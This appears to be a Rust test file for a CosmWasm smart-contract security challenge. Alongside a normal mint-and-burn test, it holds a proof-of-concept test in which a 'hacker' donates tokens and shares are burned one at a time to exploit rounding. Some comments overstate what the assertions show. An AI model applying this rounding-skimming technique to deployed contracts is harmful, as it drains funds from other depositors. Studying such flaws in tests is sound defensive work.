#[cfg(test)]
pub mod tests {
    use crate::{
        contract::DENOM,
        msg::{ExecuteMsg, InstantiateMsg, QueryMsg},
        state::{Balance, Config},
    };
    use cosmwasm_std::{coin, Addr, CosmosMsg, Empty, Uint128};
    use cw_multi_test::{App, Contract, ContractWrapper, Executor};

    pub fn challenge_contract() -> Box<dyn Contract<Empty>> {
        let contract = ContractWrapper::new(
            crate::contract::execute,
            crate::contract::instantiate,
            crate::contract::query,
        );
        Box::new(contract)
    }

    pub const USER: &str = "user";
    pub const USER2: &str = "user2";
    pub const ADMIN: &str = "admin";

    pub fn proper_instantiate() -> (App, Addr) {
        let mut app = App::default();
        let cw_template_id = app.store_code(challenge_contract());

        // init contract
        let msg = InstantiateMsg { offset: 10 };
        let contract_addr = app
            .instantiate_contract(
                cw_template_id,
                Addr::unchecked(ADMIN),
                &msg,
                &[],
                "test",
                None,
            )
            .unwrap();

        (app, contract_addr)
    }

    pub fn mint_tokens(mut app: App, recipient: String, amount: Uint128) -> App {
        app.sudo(cw_multi_test::SudoMsg::Bank(
            cw_multi_test::BankSudo::Mint {
                to_address: recipient,
                amount: vec![coin(amount.u128(), DENOM)],
            },
        ))
        .unwrap();
        app
    }

    #[test]
    fn basic_flow() {
        let (mut app, contract_addr) = proper_instantiate();

        // mint funds to user
        app = mint_tokens(app, USER.to_owned(), Uint128::new(10_000));

        // mint shares for user
        app.execute_contract(
            Addr::unchecked(USER),
            contract_addr.clone(),
            &ExecuteMsg::Mint {},
            &[coin(10_000, DENOM)],
        )
        .unwrap();

        // mint funds to user2
        app = mint_tokens(app, USER2.to_owned(), Uint128::new(10_000));

        // mint shares for user2
        app.execute_contract(
            Addr::unchecked(USER2),
            contract_addr.clone(),
            &ExecuteMsg::Mint {},
            &[coin(10_000, DENOM)],
        )
        .unwrap();

        // query user
        let balance: Balance = app
            .wrap()
            .query_wasm_smart(
                contract_addr.clone(),
                &QueryMsg::UserBalance {
                    address: USER.to_string(),
                },
            )
            .unwrap();

        // burn shares for user
        app.execute_contract(
            Addr::unchecked(USER),
            contract_addr.clone(),
            &ExecuteMsg::Burn {
                shares: balance.amount,
            },
            &[],
        )
        .unwrap();

        // burn shares for user2
        app.execute_contract(
            Addr::unchecked(USER2),
            contract_addr.clone(),
            &ExecuteMsg::Burn {
                shares: balance.amount,
            },
            &[],
        )
        .unwrap();

        let bal = app.wrap().query_balance(USER, DENOM).unwrap();
        assert_eq!(bal.amount, Uint128::new(10_000));

        let bal = app.wrap().query_balance(USER2, DENOM).unwrap();
        assert_eq!(bal.amount, Uint128::new(10_000));

        let bal = app
            .wrap()
            .query_balance(contract_addr.to_string(), DENOM)
            .unwrap();
        assert_eq!(bal.amount, Uint128::zero());
    }

    const HACKER: &str = "hacker";

    #[test]
    fn exploit_burn_rounding_skimming() {
        // base scenario with 0 funds
        let (mut app, contract_addr) = proper_instantiate();

        // mint funds to user
        app = mint_tokens(app, USER.to_owned(), Uint128::new(10_000));
        app.execute_contract(
            Addr::unchecked(USER),
            contract_addr.clone(),
            &ExecuteMsg::Mint {},
            &[coin(10_000, DENOM)],
        )
        .unwrap();

        // mint shares for hacker
        app = mint_tokens(app, HACKER.to_owned(), Uint128::new(20_000));
        app.execute_contract(
            Addr::unchecked(HACKER),
            contract_addr.clone(),
            &ExecuteMsg::Mint {},
            &[coin(10_000, DENOM)],
        )
        .unwrap();

        // Hacker bank sends token
        app.execute(
            Addr::unchecked(HACKER),
            CosmosMsg::Bank(cosmwasm_std::BankMsg::Send {
                to_address: contract_addr.to_string(),
                amount: vec![coin(3, DENOM)],
            }),
        ).unwrap();

        // Supply can deviate from
        let Config { total_supply } = app
            .wrap()
            .query_wasm_smart(contract_addr.clone(), &QueryMsg::GetConfig {})
            .unwrap();
        assert_eq!(total_supply, Uint128::new(20_000));

        // We show how user can withdraw more than they deposited
        // by burning shares in small chunks that round to hacker's favor
        for _ in 0..100 {
            app.execute_contract(
                Addr::unchecked(USER),
                contract_addr.clone(),
                &ExecuteMsg::Burn {
                    shares: Uint128::new(1),
                },
                &[],
            )
            .unwrap();
        }
        assert_eq!(
            app.wrap().query_balance(USER, DENOM).unwrap().amount,
            Uint128::new(100)
        );

        let res = Uint128::new(1)
            .multiply_ratio(Uint128::new(4), Uint128::new(3));
        assert_eq!(res, Uint128::new(1));
    }
}
